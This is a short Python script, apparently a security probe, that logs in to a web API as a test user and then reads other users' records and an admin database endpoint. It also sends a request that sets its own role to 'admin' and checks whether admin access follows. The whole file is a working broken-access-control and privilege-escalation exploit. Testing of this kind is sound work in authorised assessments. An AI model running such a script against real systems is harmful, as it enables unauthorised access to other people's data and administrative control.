import requests, json
base="https://<host>/ooklakappa"
s=requests.Session(); s.headers.update({"User-Agent":"Mozilla/5.0","Accept":"application/json"})
tok=s.post(base+"/api/login",json={"username":"qa_probe_1","password":"Probe12345!"},timeout=20).json()["token"]
H={"Authorization":"Bearer "+tok}
def show(tag,r):
    print("===",tag,r.status_code); print(r.text[:900]); print()
for p in ["/api/users/320","/api/users/1","/api/users/2","/api/admin/database"]:
    r=s.get(base+p,headers=H,timeout=20); show("GET "+p,r)
r=s.put(base+"/api/users/320",headers=H,json={"role":"admin"},timeout=20); show("PUT role admin",r)
r=s.get(base+"/api/users/320",headers=H,timeout=20); show("GET self after",r)
r=s.get(base+"/api/admin/database",headers=H,timeout=20); show("GET admin db after",r)
